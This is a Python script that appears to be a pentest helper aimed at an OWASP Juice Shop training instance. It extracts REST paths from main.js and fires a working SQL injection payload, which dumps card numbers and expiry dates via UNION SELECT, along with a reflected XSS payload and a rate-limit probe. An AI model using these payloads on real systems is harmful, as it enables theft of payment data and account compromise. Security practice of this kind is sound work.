import re
import json
from terminal_run import run_cmd

# Helper for active status capture
def get_status(base_url, path, cyberattack, is_dos, is_xss):
    path_url = base_url + path + cyberattack
    if is_dos:
        http_status = run_cmd("Juice Shop Paths Dos Vulnerability Testing", f'curl -s -o /dev/null -w "%{{http_code}}" "{path_url}"')
        return http_status
    elif is_xss:
        response = run_cmd("Juice Shop Paths XSS Vulnerability Testing", f'curl -s "{path_url}" | grep -o "<script>alert(1)</script>"')
        return response 
    else:
        result = run_cmd("Juice Shop Paths SQL Injection Vulnerability Testing", f'curl -s -o /dev/null -w "%{{http_code}},%{{size_download}}" "{path_url}"')
        http_status, content_length = result.strip().split(",")
        content_length = int(content_length)

    return http_status, content_length


def active_validation(confirmed_paths):
    """Actively validates candidates for SQLi, XSS, and DoS."""
    validated_payload = []
    base_url = "https://shop.redasmsecurity.cloud"

    sql_words = ["id=", "search", "query", "q=", "filter", "sort", "order","product", 

                 "products", "basket", "checkout", "wallet",

                "balance", "history", "track-order", "order",

                "user", "whoami", "admin", "email", "current=",

                "authentication-details", "reset-password", "change-password"]

    xss_words = ["q=", "search", "query", "message", "comment", "chat",

                "chatbot", "notification", "repeat-notification",

                "profile", "user", "username", "email",

                "language", "languages", "country", "country-mapping"]

    dos_words = ["login", "signup", "auth", "authentication",

                "2fa", "setup", "disable",

                "reset-password", "change-password",

                "captcha", "checkout", "basket", "wallet",

                "order-history", "track-order"]



    for path in confirmed_paths:

        is_sql = any(words in path.lower() for words in sql_words)
        is_xss = any(words in path.lower() for words in xss_words)
        is_dos = any(words in path.lower() for words in dos_words)

        data = {
            'url_path': path,
            'sql_candidate': is_sql,
            'xss_candidate': is_xss,
            'dos_candidate': is_dos,
            'tested': False, 
            'vulnerable': False, 
            'vulnerable_to': []
        }

        if data['sql_candidate']:
            data['tested'] = True
            sqli = "apple%27%29%29%20UNION%20SELECT%20id%2Cid%2CfullName%2CcardNum%2CexpMonth%2CexpYear%2C7%2C8%2C9%20FROM%20cards%3B"
            http_status, content_length = get_status(base_url, path, sqli, False, False)
            if http_status in ["200", "301"] and content_length > 50:
                data['vulnerable'] = True
                data['vulnerable_to'].append("sql_injection")

        if data['xss_candidate']:
            data['tested'] = True
            xss = "%3Cscript%3Ealert(1)%3C/script%3E"
            response = get_status(base_url, path, xss, False, True)
            if "<script>alert(1)</script>" in response:
                data['vulnerable'] = True
                data['vulnerable_to'].append("reflected_xss")

        if data['dos_candidate']:
            data['tested'] = True
            codes = [get_status(base_url, path, "", True, False) for _ in range(2)]
            if "429" not in codes:
                data['vulnerable'] = True
                data['vulnerable_to'].append("no_rate_limiting")

        
        validated_payload.append(data)
        
    return validated_payload



def expose_juice_shop_paths(subdomain):
    pattern = r'(/rest[^`"\s]+)'
    results = []

    with open("main.js", "r") as f:
        for line in f:
            data = re.findall(pattern, line)
            for path in data:
                results.append(path)

    results = set(results)
    for result in results:
        print(result)

    return results
